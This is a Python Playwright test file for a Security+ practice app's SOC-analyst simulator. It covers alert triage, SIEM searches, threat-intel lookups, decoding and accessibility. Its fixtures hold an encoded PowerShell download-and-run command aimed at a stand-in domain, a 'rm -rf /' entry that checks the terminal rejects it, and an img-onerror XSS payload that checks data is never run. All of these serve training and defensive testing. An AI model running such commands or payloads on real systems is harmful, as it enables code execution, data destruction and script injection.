"""SOC Simulator PBQ ("socsim", v2.99): engine = vendor/socsim.js, loaded only when a bank that has a socsim item opens.

A small made-up scenario (2 alerts, the second one is "dynamic": it shows up 3 seconds after the first case report is
submitted) is added to the Security+ bank on the fly, and a saved exam holding it is resumed (the same thing "resume" reads).
Covers: queue + dynamic alert, the SIEM search subset (and a rejected unsafe query), terminal + threat intel + decode,
report scoring and the "why" after submit, Lite / reduced motion, the 320 px phone layout, keyboard-only completion."""
import copy, json, pathlib, sys, time

import pytest
from conftest import open_guide
from test_practice import _submit

ROOT = pathlib.Path(__file__).resolve().parent.parent

BANK = json.loads((ROOT / "qbank" / "sy0-701.json").read_text(encoding="utf8"))
DSET = {d["n"]: d for d in BANK["domains"]}
PS = "dwBoAG8AYQBtAGkAIAAvAGEAbABsADsAIABpAGUAeAAgACgAaQB3AHIAIABoAHQAdABwADoALwAvAHUAcABkAGEAdABlAHMALgBlAHgAYQBtAHAAbABlAC8AYgA2ADQALgBwAHMAMQApAA=="


def ev(t, i, st, f, raw, fx=None):
    e = {"t": t, "i": i, "st": st, "f": f, "raw": raw}
    if fx:
        e["fx"] = fx
    return e


SS = {
    "id": "t-soc-1", "t": "pbq", "kind": "socsim", "d": "4.0", "obj": "4.9",
    "title": "Tier 1 triage: two alerts", "scenario": "You are the Tier 1 analyst on shift. Work the alerts that reach your queue.",
    "minutes": 1, "day": "2026-03-14", "now": "09:30:00", "host": "analyst",
    "alerts": [
        {"id": "a1", "name": "Service account logon off hours", "sev": "low", "t": "09:21:00", "host": "FIN-02", "desc": "svc_backup logged on to FIN-02 from 10.0.0.5.",
         "ans": {"tp": 0, "why": "Nightly backup job: a known service account from the backup server. Closing it is right; escalating wastes Tier 2's time.",
                 "cls": {"why": "svc_backup runs every night from 10.0.0.5, so this is expected."}, "esc": {"why": "Nothing malicious happened, so there is nothing to escalate."}}},
        {"id": "a2", "name": "Encoded PowerShell on WS-04", "sev": "high", "t": "09:15:00", "host": "WS-04", "desc": "powershell.exe ran with -enc on WS-04 as jdoe.", "after": "a1", "at": 3,
         "ans": {"tp": 1, "why": "Encoded PowerShell that downloads a script is a classic attacker move. Escalate and contain.",
                 "cls": {"why": "It decodes to a download of a script from a bad domain."}, "esc": {"why": "A confirmed download needs Tier 2 and containment."},
                 "sev": {"v": "high", "why": "Code ran on a user machine and fetched more code."}, "tech": {"v": "T1059.001", "why": "PowerShell was used to run the command."},
                 "host": {"v": ["ws-04", "jdoe"], "why": "The command ran on WS-04 as jdoe."}, "act": {"v": "iso", "why": "Isolate the host first, then investigate."},
                 "iocs": [{"k": "domain", "v": "updates.example", "why": "The script came from this domain."}, {"k": "ip", "v": "203.0.113.7", "why": "The threat feed lists this address as malicious."},
                          {"k": "ip", "v": "10.0.0.5", "need": 0, "why": "Our own backup server is not an indicator."}]}},
    ],
    "events": [
        ev("09:05:11", "win", "wineventlog", {"host": "WS-04", "user": "jdoe", "eventcode": "4625", "src_ip": "203.0.113.7"}, "Failed logon user=jdoe src_ip=203.0.113.7 logon_type=3", "spray"),
        ev("09:05:14", "win", "wineventlog", {"host": "WS-04", "user": "asmith", "eventcode": "4625", "src_ip": "203.0.113.7"}, "Failed logon user=asmith src_ip=203.0.113.7 logon_type=3", "spray"),
        ev("09:06:02", "win", "wineventlog", {"host": "WS-04", "user": "jdoe", "eventcode": "4624", "src_ip": "203.0.113.7"}, "Successful logon user=jdoe src_ip=203.0.113.7", "spray-win"),
        ev("09:12:40", "proxy", "proxy", {"host": "WS-04", "user": "jdoe", "dest": "updates.example"}, "GET http://updates.example/b64.ps1 200"),
        ev("09:15:00", "win", "sysmon", {"host": "WS-04", "user": "jdoe", "image": "powershell.exe"}, "powershell.exe -enc " + PS, "psenc"),
        ev("09:20:00", "av", "av", {"host": "FIN-02", "user": "svc_backup"}, "Scheduled scan finished, 0 threats"),
        ev("09:21:00", "win", "wineventlog", {"host": "FIN-02", "user": "svc_backup", "eventcode": "4624", "src_ip": "10.0.0.5"}, "Successful logon svc_backup from 10.0.0.5"),
    ],
    "cmds": [{"run": ["show-net ws-04"], "out": "ws-04 -> 203.0.113.7:443 ESTABLISHED", "fx": "net"}],
    "suggest": ["show-net ws-04"], "suggestq": ["index=win | stats count by user"],
    "ti": [{"ind": "203.0.113.7", "v": "malicious", "note": "Seen in password spraying (made-up feed)."}, {"ind": "updates.example", "v": "malicious", "note": "Serves a script downloader (made-up feed)."}],
    "checks": [{"t": "Look up the source IP in threat intel", "has": "ti:203.0.113.7", "why": "Checking an IP in threat intel is the quick first step."},
               {"t": "Decode the encoded command", "has": "dec:b64", "why": "-enc commands are Base64; decoding shows what they do."}],
}


def bank_with(q):
    b = copy.deepcopy(BANK)
    b["q"].append(q)
    return json.dumps(b)


def start(site, q=None, device="desktop", pick=None, lite=True, inject=True):
    """Open the app with a saved Security+ exam holding the socsim item, resume it. Returns (watched, page, requests)."""
    q = q or SS
    w = site(device, lite=lite, service_workers="block")   # so page.route sees the bank request
    p = w.page
    if inject:
        p.route("**/qbank/sy0-701.json", lambda r: r.fulfill(body=bank_with(q), content_type="application/json"))
    item = {"id": q["id"], "ro": [], "pick": pick or {"el": 0, "tab": "al", "sel": "", "own": {}, "sub": {}, "act": [], "r": {}, "up": 0, "lq": "", "lr": "all"}}
    run = {"v": 1, "gid": "secplus", "cert": "Security+", "kind": "full", "src": "bank", "ver": "v7", "title": "Security+ V7",
           "items": [item], "i": 0, "dur": 5400, "used": 0, "t": int(time.time() * 1000)}
    p.evaluate("r=>localStorage.setItem('cgcp.mx.run',JSON.stringify(r))", run)
    reqs = []
    p.on("request", lambda r: reqs.append(r.url))
    open_guide(p, "security+")
    p.click('#mxp [data-mx="resume"]')
    p.wait_for_selector("#mx[open]")
    p.wait_for_selector("#mx-body .ss")
    return w, p, reqs


def tab(p, name):
    """On a phone, go to a pane (on a wide screen every pane is already showing)."""
    if p.is_visible(".ss-tabs"):
        p.click("#ss-t-" + name)


def work_a1(p, escalate="n"):
    """Take alert a1 and submit its case report (false positive, closed unless told otherwise)."""
    p.click('.ss-ab[data-id="a1"]') if p.locator('.ss-al.sel[data-id="a1"]').count() == 0 else None
    if p.locator("#ss-p-al [data-take=a1]").count():
        p.click("#ss-p-al [data-take=a1]")
    tab(p, "rp")
    p.select_option("#ss-c", "fp")
    p.select_option("#ss-e", escalate)
    p.click(".ss-f button[type=submit]")


def work_a2(p, good=True):
    p.wait_for_selector('.ss-ab[data-id="a2"]', timeout=8000)
    p.click('.ss-ab[data-id="a2"]')
    p.click("#ss-p-al [data-take=a2]")
    tab(p, "rp")
    if good:
        p.select_option("#ss-c", "tp"); p.select_option("#ss-s", "high"); p.select_option("#ss-e", "y"); p.select_option("#ss-a", "iso")
        p.select_option("#ss-t", "T1059.001"); p.fill("#ss-h", "WS-04")
        p.fill('[data-i=domain]', "updates[.]example"); p.fill('[data-i=ip]', "203.0.113[.]7")
        p.fill("#ss-n", "Encoded PowerShell pulled a script. Escalated.")
    else:
        p.select_option("#ss-c", "fp"); p.select_option("#ss-e", "n")
    p.click(".ss-f button[type=submit]")


def finish(p):
    _submit(p)
    p.wait_for_selector("#mx-body .mx-list, #mx-body .mx-res", state="attached")
    return p.evaluate("JSON.parse(localStorage.getItem('cgcp.mx.secplus'))[0]")


def no_sideways_scroll(p):
    assert p.evaluate("()=>{var b=document.getElementById('mx-body');return b.scrollWidth<=b.clientWidth+1}"), "the exam body scrolls sideways"


def search(p, s, rng="all"):
    tab(p, "si")
    p.fill("#ss-qi", s)
    p.select_option("#ss-qr", rng)
    p.click("#ss-p-si button[type=submit]")
    return p.inner_text("#ss-res")


# ---------------------------------------------------------------- data rules
def test_fixture_passes_the_bank_checker_and_bad_data_fails():
    sys.path.insert(0, str(ROOT / ".github" / "scripts"))
    import check_site
    assert check_site.check_new_pbq(SS, DSET) == []
    bad = copy.deepcopy(SS); bad["events"][0]["raw"] = "from 8.8.8.8 to ok"
    assert any("public address" in m for m in check_site.check_new_pbq(bad, DSET))
    bad = copy.deepcopy(SS); bad["ti"][1]["ind"] = "evil.com"
    assert any("under .example" in m for m in check_site.check_new_pbq(bad, DSET))
    bad = copy.deepcopy(SS); bad["alerts"][1]["ans"]["why"] = ""
    assert any("'why'" in m for m in check_site.check_new_pbq(bad, DSET))
    bad = copy.deepcopy(SS); bad["alerts"][0]["ans"]["tp"] = 1
    assert any("true positive" in m for m in check_site.check_new_pbq(bad, DSET))
    bad = copy.deepcopy(SS); bad["events"] = bad["events"] * 70
    assert any("3-400 events" in m for m in check_site.check_new_pbq(bad, DSET))
    bad = copy.deepcopy(SS); bad["checks"][0]["has"] = "ti:nothing"
    assert any("nothing in the scenario" in m for m in check_site.check_new_pbq(bad, DSET))
    bad = copy.deepcopy(SS); bad["alerts"][1]["after"] = "zz"
    assert any("'after'" in m for m in check_site.check_new_pbq(bad, DSET))
    bad = copy.deepcopy(SS); bad["minutes"] = 90
    assert any("minutes" in m for m in check_site.check_new_pbq(bad, DSET))


def test_engine_loads_only_when_a_bank_needs_it(site):
    w = site()
    p = w.page
    reqs = []
    p.on("request", lambda r: reqs.append(r.url))
    open_guide(p, "security+")
    p.click('#mxp [data-mx="quick"]')                    # a quick set uses the guide quiz, no bank
    p.wait_for_selector("#mx[open]")
    assert not [u for u in reqs if "socsim" in u], "the SOC engine downloaded for an exam with no socsim item"
    p.keyboard.press("Escape")
    w2, p2, reqs2 = start(site)
    assert [u for u in reqs2 if u.endswith("vendor/socsim.js")]


# ---------------------------------------------------------------- queue, dynamic alert, report
def test_queue_dynamic_alert_and_ownership(site):
    w, p, _ = start(site)
    assert p.locator(".ss-al").count() == 1, "the dynamic alert showed up too early"
    p.click("[data-go=rp]") if p.locator("[data-go=rp]").count() else None
    assert "Take" in p.inner_text("#ss-p-rp"), "the report must ask you to take the alert first"
    assert p.locator("#ss-c").count() == 0
    p.click("#ss-p-al [data-take=a1]")
    assert p.locator("#ss-c").count() == 1 and "In progress" in p.inner_text(".ss-al")
    tab(p, "rp")
    p.click(".ss-f button[type=submit]")                                      # nothing chosen yet
    assert "Choose a classification" in p.inner_text("#ss-m")
    work_a1(p)
    assert "Closed" in p.inner_text("#ss-p-al")
    assert p.locator("#ss-c:disabled").count() == 1, "a submitted report must lock"
    tab(p, "al")
    p.wait_for_selector('.ss-ab[data-id="a2"]', timeout=8000)
    assert "New alert: Encoded PowerShell" in p.text_content("#ss-live")      # screen reader announcement


def test_new_alert_badge_when_on_another_tab(site):
    w, p, _ = start(site, device="small320")
    work_a1(p)
    tab(p, "si")
    p.wait_for_selector("#ss-badge.on", timeout=8000)
    assert p.inner_text("#ss-badge") == "1"
    tab(p, "al")
    assert p.locator("#ss-badge.on").count() == 0


def test_perfect_report_scores_full_and_explains_after_submit(site):
    w, p, _ = start(site)
    work_a1(p)
    work_a2(p)
    p.fill("#ss-ci", "show-net ws-04"); p.press("#ss-ci", "Enter")
    p.fill("#ss-tii", "203.0.113[.]7"); p.press("#ss-tii", "Enter")                      # defanged lookup still counts
    p.select_option("#ss-dk", "b64"); p.fill("#ss-di", PS); p.press("#ss-di", "Enter")
    body = p.inner_text("#mx-body")
    assert "Serves a script downloader" not in body and "Isolate the host first" not in body, "a 'why' showed up during the exam"
    rec = finish(p)
    assert rec["s"] == 1, rec
    review = p.text_content("#mx-body")
    assert "Isolate the host first" in review and "Model case report: Encoded PowerShell" in review and "Escalated." not in review.split("Model case report")[0]
    assert "Encoded PowerShell pulled a script" in review                      # the learner's own summary is shown, unscored


def test_wrong_escalation_and_missed_true_positive_cost_points(site):
    w, p, _ = start(site)
    work_a1(p, escalate="y")                                                   # escalated a false positive
    work_a2(p, good=False)                                                     # called a true positive false
    rec = finish(p)
    assert rec["s"] < .3, rec
    w2, p2, _ = start(site)
    assert finish(p2)["s"] == 0, "a scenario nobody touched must score 0"


def test_time_up_locks_and_keeps_answers(site):
    w2, p2, _ = start(site, pick={"el": 58, "tab": "al", "sel": "", "own": {"a1": 1}, "sub": {}, "act": [], "r": {"a1": {"c": "fp", "s": "", "e": "n", "t": "", "h": "", "i": {"ip": "", "domain": "", "hash": "", "file": ""}, "a": "", "n": "", "d": 0}}, "up": 0, "lq": "", "lr": "all"})
    p2.wait_for_selector("#ss-cd:has-text('Scenario time is up')", timeout=6000)
    assert p2.locator("#ss-c:disabled").count() == 1
    assert "Time is up" in p2.text_content("#ss-live")
    rec = finish(p2)
    assert 0 < rec["s"] < 1, rec                                               # what was filled in before time ran out still counts


# ---------------------------------------------------------------- SIEM
def test_siem_subset_and_rejected_queries(site):
    w, p, _ = start(site)
    out = search(p, "index=win EventCode=4625")
    assert "2 events matched" in out and "asmith" in out
    assert "1 event matched" in search(p, "index=win eventcode=4625 AND user=j*")
    assert "3 events matched" in search(p, "sourcetype=wineventlog src_ip=203.0.113.7")
    assert "Type a search first" in search(p, "")
    assert "3 events matched" in search(p, "index=win NOT eventcode=4625 NOT user=asmith")      # both 4624 logons + the sysmon event
    out = search(p, "index=win | stats count by user | sort -count | head 1")
    assert "jdoe" in out and "asmith" not in out
    out = search(p, "updates.example | table _time host dest")
    assert "1 event matched" in out and "WS-04" in out
    assert "0 events matched" in search(p, "zzzz")
    out = search(p, "(eventcode=4624 OR eventcode=4625) user=jdoe")
    assert "2 events matched" in out
    assert "2 events matched" in search(p, "index=win", "15m") and "5 events matched" in search(p, "index=win", "1h")   # now is 09:30
    assert p.locator(".ss-hist i").count() == 12
    for bad, msg in [("index=win | eval x=1", "not available"), ("index=win | rex field=_raw \"(?<a>.*)\"", "not available"), ("index=win | delete", "not available"),
                     ("index=win | head 9999", "head needs"), ("index=win | stats sum(x)", "must be followed"), ('index="win', "quote"), ("(index=win", "bracket")]:
        assert msg in search(p, bad), bad
    assert p.locator("#ss-res table").count() == 0, "a rejected search must show no results"
    assert p.evaluate("()=>JSON.parse(localStorage.getItem('cgcp.mx.run')).items[0].pick.act.filter(a=>a.k==='q').length") >= 6


# ---------------------------------------------------------------- terminal, threat intel, decode
def test_terminal_threat_intel_and_decode(site):
    w, p, _ = start(site)
    tab(p, "vm")
    p.fill("#ss-ci", "show-net ws-04"); p.press("#ss-ci", "Enter")
    p.fill("#ss-ci", "rm -rf /"); p.press("#ss-ci", "Enter")
    out = p.inner_text(".ss-scr")
    assert "ESTABLISHED" in out and "Not available in this lab" in out
    p.fill("#ss-ci", "x" * 120); p.press("#ss-ci", "Enter")
    assert p.get_attribute("#ss-ci", "maxlength") == "120"
    p.fill("#ss-tii", "hxxp://updates[.]example"); p.press("#ss-tii", "Enter")
    p.fill("#ss-tii", "updates.example"); p.press("#ss-tii", "Enter")
    p.fill("#ss-tii", "unknown.test"); p.press("#ss-tii", "Enter")
    out = p.inner_text(".ss-scr")
    assert "MALICIOUS" in out and "Serves a script downloader" in out and "unknown" in out
    p.select_option("#ss-dk", "b64"); p.fill("#ss-di", PS); p.press("#ss-di", "Enter")
    assert "iex (iwr http://updates.example/b64.ps1)" in p.inner_text(".ss-scr")      # UTF-16 PowerShell style decodes
    p.fill("#ss-di", "%68%74%74%70%3A%2F%2Fa.test"); p.select_option("#ss-dk", "url"); p.press("#ss-di", "Enter")
    p.select_option("#ss-dk", "defang"); p.fill("#ss-di", "http://a.test/x"); p.press("#ss-di", "Enter")
    p.select_option("#ss-dk", "refang"); p.fill("#ss-di", "hxxp://a[.]test"); p.press("#ss-di", "Enter")
    p.select_option("#ss-dk", "b64"); p.fill("#ss-di", "not base64!!"); p.press("#ss-di", "Enter")
    out = p.inner_text(".ss-scr")
    assert "http://a.test" in out and "hxxp://a[.]test/x" in out and "Not valid Base64" in out
    p.press("#ss-ci", "ArrowUp")
    assert p.input_value("#ss-ci") == "x" * 120   # the last command that was run
    # the scored checks: the lookup of the (defanged) IP and the decode both count
    p.fill("#ss-tii", "203.0.113[.]7"); p.press("#ss-tii", "Enter")
    rec = finish(p)
    assert 0 < rec["s"] < 1


def test_scripts_in_data_are_never_run(site):
    q = copy.deepcopy(SS)
    q["events"][3]["raw"] = "GET http://updates.example/<img src=x onerror=window.__hit=1> 200"
    q["alerts"][0]["name"] = "<img src=x onerror=window.__hit=1> alert"
    w, p, _ = start(site, q)
    search(p, "updates.example")
    tab(p, "al")
    assert p.evaluate("()=>window.__hit") is None
    assert p.locator(".ss img").count() == 0


# ---------------------------------------------------------------- motion, layout, keyboard
def test_motion_is_off_in_lite_and_for_reduced_motion(site):
    w, p, _ = start(site, lite=True)
    assert p.locator(".ss.ss-m").count() == 0 and p.locator(".ss-tick").count() == 0
    work_a1(p)
    p.wait_for_selector('.ss-ab[data-id="a2"]', timeout=8000)
    assert p.evaluate("()=>getComputedStyle(document.querySelector('.ss-al.new')||document.querySelector('.ss-al')).animationName") == "none"
    w2, p2, _ = start(site, device="reduced", lite=False)
    assert p2.locator(".ss.ss-m").count() == 0 and p2.locator(".ss-tick").count() == 0, "reduced motion must switch the motion off"


def test_motion_on_runs_only_transform_and_opacity_and_pauses_when_hidden(site):
    w2, p2, _ = start(site, lite=False)
    assert p2.locator(".ss.ss-m").count() == 1 and p2.locator(".ss-tick .ss-tick-in").count() == 1
    assert p2.get_attribute(".ss-tick", "aria-hidden") == "true"
    names = p2.evaluate("()=>getComputedStyle(document.querySelector('.ss-tick-in')).animationName")
    assert names == "ss-run"
    css = p2.evaluate("()=>document.getElementById('socsim-css').textContent")
    import re
    for blk in re.findall(r"@keyframes [\w-]+\{(.*?)\}\}", css):
        assert not re.search(r"(width|height|top|left|margin|padding)\s*:", blk), "a keyframe animates layout"
    p2.evaluate("()=>{Object.defineProperty(document,'hidden',{value:true,configurable:true});document.dispatchEvent(new Event('visibilitychange'))}")
    assert p2.locator(".ss.ss-paused").count() == 1
    before = p2.evaluate("()=>JSON.parse(localStorage.getItem('cgcp.mx.run')).items[0].pick.el")
    p2.wait_for_timeout(2200)
    assert p2.evaluate("()=>JSON.parse(localStorage.getItem('cgcp.mx.run')).items[0].pick.el") == before, "the scenario clock kept running in a hidden tab"


def test_phone_320_layout_tabs_and_no_sideways_scroll(site):
    w, p, _ = start(site, device="small320")
    assert p.is_visible(".ss-tabs") and p.locator(".ss-pane.on").count() == 1
    for name in ("al", "si", "vm", "rp"):
        p.click("#ss-t-" + name)
        assert p.locator(".ss-pane.on").count() == 1 and p.is_visible("#ss-p-" + name)
        no_sideways_scroll(p)
    p.focus("#ss-t-rp")
    p.keyboard.press("ArrowLeft")
    assert p.get_attribute("#ss-t-vm", "aria-selected") == "true"
    search(p, "index=win | table _time host user eventcode src_ip")
    no_sideways_scroll(p)
    sizes = p.evaluate("()=>[...document.querySelectorAll('.ss button,.ss select,.ss input')].filter(e=>e.offsetParent).map(e=>[e.className||e.id,e.getBoundingClientRect().height]).filter(x=>x[1]<40)")
    assert not sizes, sizes
    w2, p2, _ = start(site)
    assert not p2.is_visible(".ss-tabs") and p2.locator(".ss-pane").evaluate_all("els=>els.every(e=>getComputedStyle(e).display!=='none')"), "wide screens show every pane at once"


def test_keyboard_only_completion(site):
    w, p, _ = start(site, device="desktop")
    p.focus('.ss-ab[data-id="a1"]')
    p.keyboard.press("Enter")                                  # open it (already open: stays); then take it
    p.focus("#ss-p-al [data-take=a1]")
    p.keyboard.press("Enter")
    p.focus("#ss-c"); p.keyboard.type("F")                      # False positive
    p.focus("#ss-e"); p.keyboard.type("N")                      # No, close it
    p.focus(".ss-f button[type=submit]"); p.keyboard.press("Enter")
    assert "Closed" in p.inner_text("#ss-p-al")
    p.wait_for_selector('.ss-ab[data-id="a2"]', timeout=8000)
    p.focus('.ss-ab[data-id="a2"]'); p.keyboard.press("Enter")
    p.focus("#ss-p-al [data-take=a2]"); p.keyboard.press("Enter")
    p.focus("#ss-c"); p.keyboard.type("T")
    p.focus("#ss-e"); p.keyboard.type("Y")
    p.focus("#ss-qi"); p.keyboard.type("index=proxy"); p.keyboard.press("Enter")
    assert "1 event matched" in p.inner_text("#ss-res")
    p.focus("#ss-ci"); p.keyboard.type("show-net ws-04"); p.keyboard.press("Enter")
    assert "ESTABLISHED" in p.inner_text(".ss-scr")
    p.focus("#ss-p-rp .ss-f button[type=submit]"); p.keyboard.press("Enter")
    assert "Escalated" in p.inner_text("#ss-p-al")
    rec = finish(p)
    assert 0 < rec["s"] < 1


def test_resume_keeps_the_scenario_state(site):
    w, p, _ = start(site)
    work_a1(p)
    search(p, "index=av")
    p.reload()
    open_guide(p, "security+")
    p.click('#mxp [data-mx="resume"]')
    p.wait_for_selector("#mx-body .ss")
    assert "Closed" in p.inner_text("#ss-p-al") and p.input_value("#ss-qi") == "index=av"
    assert "1 event matched" in p.inner_text("#ss-res")


def test_axe_on_the_simulator(site):
    from test_a11y import _axe, _check
    w, p, _ = start(site)
    p.click("#ss-p-al [data-take=a1]")
    search(p, "index=win")
    bad = [v for v in _axe(p) if v["where"] != ["#mx-tbtn"]]   # #mx-tbtn is the exam dialog's own button, not the simulator
    _check(bad, "socsim")
